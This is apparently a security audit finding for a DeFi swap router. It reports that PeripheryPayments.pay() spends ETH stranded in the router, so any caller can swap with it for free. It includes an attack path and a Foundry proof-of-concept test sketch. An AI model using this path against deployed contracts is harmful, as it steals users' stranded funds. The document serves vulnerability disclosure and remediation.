The vulnerability is real. Let me trace the full execution path precisely.

**Execution trace for `exactInputSingle` with `tokenIn=WETH`:**

1. `exactInputSingle` stores `payer = msg.sender`, `tokenToPay = WETH` in transient storage. [1](#0-0) 

2. Pool calls back `metricOmmSwapCallback` → `_justPayCallback` → `pay(WETH, msg.sender, pool, amount)`. [2](#0-1) 

3. Inside `pay()`, since `payer != address(this)` and `token == WETH`, the ETH-first branch executes: [3](#0-2) 

If `address(this).balance >= value`, the router wraps its own ETH and sends WETH to the pool — **the payer's WETH is never touched**.

**How ETH accumulates in the router:**

The native ETH swap pattern (documented in tests) is: `multicall{value: X}(exactInputSingle(..., tokenIn=WETH, amountIn=Y))`. If `X > Y`, residual ETH stays in the router. Users are expected to append `refundETH()` to the multicall, but this is not enforced. [4](#0-3) 

The `receive()` guard only blocks direct ETH pushes; it does not prevent ETH from accumulating via `multicall{value}`. [5](#0-4) 

---

### Title
Router ETH Balance Consumed Instead of Payer's WETH When Router Holds Residual ETH — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`PeripheryPayments.pay()` uses the router's native ETH balance first when `token == WETH`, regardless of whether the current caller sent that ETH. Any ETH left in the router from a prior user's multicall (who omitted `refundETH()`) can be consumed by a subsequent caller who sets `tokenIn=WETH` without providing any ETH or WETH approval.

### Finding Description
`pay()` branches on `address(this).balance` when `token == WETH`:

```solidity
uint256 nativeBalance = address(this).balance;
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);   // payer's WETH never touched
} else if (nativeBalance > 0) {
    // partial ETH + transferFrom for remainder
} else {
    IERC20(WETH).safeTransferFrom(payer, recipient, value);
}
```

There is no check that the ETH in the router belongs to the current caller. The payer stored in transient context is ignored entirely when `nativeBalance >= value`.

**Attack path:**
1. Victim calls `multicall{value: 1 ETH}([exactInputSingle(tokenIn=WETH, amountIn=0.5 ETH)])` — omits `refundETH()`. 0.5 ETH remains in the router.
2. Attacker calls `exactInputSingle(tokenIn=WETH, amountIn=0.5 ETH)` with zero ETH sent and zero WETH approved.
3. `pay()` sees `nativeBalance = 0.5 ETH >= 0.5 ETH`, wraps the router's ETH, and pays the pool.
4. Attacker receives output tokens; victim's 0.5 ETH is gone.

### Impact Explanation
Direct loss of user principal. Any ETH stranded in the router (a realistic outcome when users omit `refundETH()`) is freely claimable by any address that calls a WETH-input swap. The attacker pays nothing and receives the full swap output.

### Likelihood Explanation
The native ETH swap pattern requires users to manually append `refundETH()` to their multicall. Omitting it is a realistic user error, and the protocol's own test suite demonstrates this exact pattern. Once ETH is stranded, the exploit requires only a single public router call with no special permissions.

### Recommendation
Track per-transaction ETH contributions in transient storage (e.g., store `msg.value` at multicall/swap entry) and only allow `pay()` to consume up to that amount from the router's ETH balance. Alternatively, require that the ETH-from-router path is only reachable when `msg.value > 0` in the originating call, or enforce that `pay()` always uses `transferFrom` when the router's ETH was not deposited by the current top-level caller.

### Proof of Concept
```solidity
// Foundry test sketch
function test_strandedEthStolenViaWethSwap() public {
    // Victim sends 1 ETH but only swaps 0.5 ETH, omits refundETH()
    vm.deal(victim, 1 ether);
    vm.prank(victim);
    router.multicall{value: 1 ether}(
        _encodeExactInputSingle(address(weth), address(token1), 0.5 ether)
    );
    assertEq(address(router).balance, 0.5 ether); // stranded ETH

    // Attacker has no ETH, no WETH approved
    vm.prank(attacker);
    uint256 out = router.exactInputSingle(
        ExactInputSingleParams({tokenIn: address(weth), amountIn: 0.5 ether, ...})
    );
    assertGt(out, 0);                             // attacker received tokens
    assertEq(address(router).balance, 0);         // victim's ETH drained
}
```

### Citations

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-71)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
